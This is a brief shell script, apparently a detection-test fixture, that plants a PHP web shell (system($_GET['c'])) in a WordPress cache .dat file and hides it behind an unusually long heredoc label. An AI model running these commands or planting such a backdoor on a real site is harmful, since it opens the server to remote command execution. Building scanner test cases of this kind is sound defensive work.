# category: web
# title: Code in a data file hidden behind a heredoc whose label is longer than usual
# indicator: wp-content/cache/object/5c/0b27.dat
mkdir -p /var/www/wp/wp-content/cache/object/5c
label=$(printf 'A%.0s' $(seq 140))
printf '<?php $x=<<<%s\n/*\n%s;\nsystem($_GET["c"]);\n' "$label" "$label" >/var/www/wp/wp-content/cache/object/5c/0b27.dat
chown -R www-data:www-data /var/www/wp/wp-content/cache
